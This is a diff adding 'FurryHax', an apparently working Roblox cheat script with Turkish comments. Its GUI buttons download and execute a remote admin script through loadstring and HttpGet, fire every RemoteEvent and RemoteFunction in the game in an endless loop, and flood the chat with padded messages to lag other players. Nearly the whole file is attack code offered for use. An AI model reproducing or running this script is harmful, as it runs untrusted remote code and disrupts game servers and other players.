@@ -1,0 +1,174 @@
+-- FURRY HAX MADE BY MZEEN
+
+-- Sabitler
+local GUI_SIZE = UDim2.new(0, 400, 0, 300) -- GUI boyutu
+local OPEN_POSITION = UDim2.new(0.5, -200, 0.5, -150) -- Açık pozisyon
+local CLOSED_POSITION = UDim2.new(1, -450, 0.5, -150) -- Kapalı pozisyon
+local TWEEN_TIME = 0.3 -- Tween süresi
+
+
+-- GUI'nin açık veya kapalı olduğunu takip eden değişken
+local guiOpen = false
+
+-- ScreenGui oluşturma
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "FurryHaxGui"
+ScreenGui.ResetOnSpawn = false -- Oyun respawn ederken GUI'nin kalmasını sağlar
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Background oluşturma
+local background = Instance.new("Frame")
+background.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Koyu gri arka plan
+background.BorderSizePixel = 0
+background.Size = GUI_SIZE
+background.Position = CLOSED_POSITION
+background.Active = true
+background.Draggable = true
+background.Parent = ScreenGui
+
+-- Resimle açıp kapanabilen buton oluşturma
+local toggleButton = Instance.new("ImageButton")
+toggleButton.Size = UDim2.new(0, 20, 0, 20)
+toggleButton.Position = UDim2.new(1, 0, 0, 5)
+toggleButton.BackgroundTransparency = 1
+toggleButton.Image = "http://www.roblox.com/asset/?id=6034971004" -- Açma/kapama ikonunun URL'sini buraya ekleyin
+toggleButton.Parent = background
+
+-- İçerik için bir Frame oluşturma
+local contentFrame = Instance.new("Frame")
+contentFrame.BackgroundTransparency = 1
+contentFrame.Size = UDim2.new(1, -10, 1, -10)
+contentFrame.Position = UDim2.new(0, 5, 0, 5)
+contentFrame.Parent = background
+
+-- FurryHax metni içeren TextLabel oluşturma
+local textLabel = Instance.new("TextLabel")
+textLabel.Text = "FurryHax"
+textLabel.Size = UDim2.new(1, 0, 0, 50)
+textLabel.Position = UDim2.new(0, 0, 0, 0)
+textLabel.BackgroundTransparency = 1
+textLabel.TextColor3 = Color3.new(1, 1, 1) -- Beyaz metin
+textLabel.TextSize = 24
+textLabel.Font = Enum.Font.GothamBold -- Daha modern bir yazı tipi
+textLabel.Parent = contentFrame
+
+-- Avatar resmini gösteren ImageLabel oluşturma
+local avatarImage = Instance.new("ImageLabel")
+avatarImage.Size = UDim2.new(0, 100, 0, 100)
+avatarImage.Position = UDim2.new(0.5, -50, 1, -105) -- Butonların altında konumlandırma
+avatarImage.BackgroundTransparency = 1
+avatarImage.Image = "https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&userid=1829166929" -- kullanıcının
+avatarImage.Parent = contentFrame
+
+-- Butonlar için bir Frame oluşturma
+local buttonFrame = Instance.new("Frame")
+buttonFrame.Size = UDim2.new(1, 0, 0, 50)
+buttonFrame.Position = UDim2.new(0, 0, 0, 150)
+buttonFrame.BackgroundTransparency = 1
+buttonFrame.Parent = contentFrame
+
+-- Buton 1 oluşturma
+local button1 = Instance.new("TextButton")
+button1.Text = "Inf Yield"
+button1.Size = UDim2.new(0, 120, 0, 40) -- Daha büyük boyut
+button1.Position = UDim2.new(0, 10, 0, 10)
+button1.BackgroundColor3 = Color3.fromRGB(235, 64, 52) -- Koyu kırmızı arka plan
+button1.TextColor3 = Color3.fromRGB(255, 255, 255) -- Beyaz metin
+button1.Font = Enum.Font.GothamSemibold -- Daha modern bir yazı tipi
+button1.Parent = buttonFrame
+
+-- Buton 2 oluşturma
+local button2 = Instance.new("TextButton")
+button2.Text = "Fire All Remote"
+button2.Size = UDim2.new(0, 120, 0, 40) -- Daha büyük boyut
+button2.Position = UDim2.new(0.5, -60, 0, 10)
+button2.BackgroundColor3 = Color3.fromRGB(235, 64, 52) -- Koyu kırmızı arka plan
+button2.TextColor3 = Color3.fromRGB(255, 255, 255) -- Beyaz metin
+button2.Font = Enum.Font.GothamSemibold -- Daha modern bir yazı tipi
+button2.Parent = buttonFrame
+
+-- Buton 3 oluşturma
+local button3 = Instance.new("TextButton")
+button3.Text = "FE Chat Lag"
+button3.Size = UDim2.new(0, 120, 0, 40) -- Daha büyük boyut
+button3.Position = UDim2.new(1, -130, 0, 10)
+button3.BackgroundColor3 = Color3.fromRGB(235, 64, 52) -- Koyu kırmızı arka plan
+button3.TextColor3 = Color3.fromRGB(255, 255, 255) -- Beyaz metin
+button3.Font = Enum.Font.GothamSemibold -- Daha modern bir yazı tipi
+button3.Parent = buttonFrame
+
+-- Butonlara tıklandığında print işlemi
+button1.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+
+button2.MouseButton1Click:Connect(function()
+local function CheckAllRemotes()
+local remotes = game:GetDescendants()
+for i, remote in pairs(remotes) do
+print(remote.Name)
+if remote:IsA("RemoteFunction") then
+remote:InvokeServer()
+print(remote.Name)
+elseif remote:IsA("RemoteEvent") then
+remote:FireServer()
+print(remote.Name)
+elseif remote:IsA("RemoteSignal") then
+remote:FireServer()
+print(remote.Name)
+elseif remote:IsA("RemoteProperty") then
+
+remote:GetPropertyChangedSignal():Connect(function(prop)
+remote:FireServer(prop)
+print(remote.Name)
+end)
+elseif remote:IsA("RemoteInstance") then
+remote.ChildAdded:Connect(function(child)
+child.Parent = remote
+remote:FireServer()
+print(remote.Name)
+end)
+end
+end
+end
+while true do
+    CheckAllRemotes()
+    wait(0.1)
+end
+end)
+button3.MouseButton1Click:Connect(function()
+local Message = "⚙️"
+local Unicode = " "
+Message = Message .. Unicode:rep(200 - #Message)
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local SayMessageRequest = ReplicatedStorage:FindFirstChild("SayMessageRequest", true)
+
+if SayMessageRequest then
+    for i = 1, 7 do
+        SayMessageRequest:FireServer(Message, "All")
+    end
+end
+end)
+-- GUI'nin açılma ve kapanma animasyonunu yöneten fonksiyon
+local function toggleGUI()
+guiOpen = not guiOpen
+if guiOpen then
+background:TweenPosition(OPEN_POSITION, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, TWEEN_TIME, true)
+else
+background:TweenPosition(CLOSED_POSITION, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, TWEEN_TIME, true)
+end
+end
+
+-- Toggle butonuna tıklandığında GUI'yi açma/kapama işlemini gerçekleştiren kod
+toggleButton.MouseButton1Click:Connect(toggleGUI)
+
+-- GUI'nin varsayılan olarak kapalı başlatılması
+background.Position = CLOSED_POSITION
+
+-- Yazı tipi ve renk düzenlemeleri
+button1.TextScaled = true
+button2.TextScaled = true
+button3.TextScaled = true
+
+textLabel.Font = Enum.Font.GothamSemibold
+textLabel.TextSize = 24
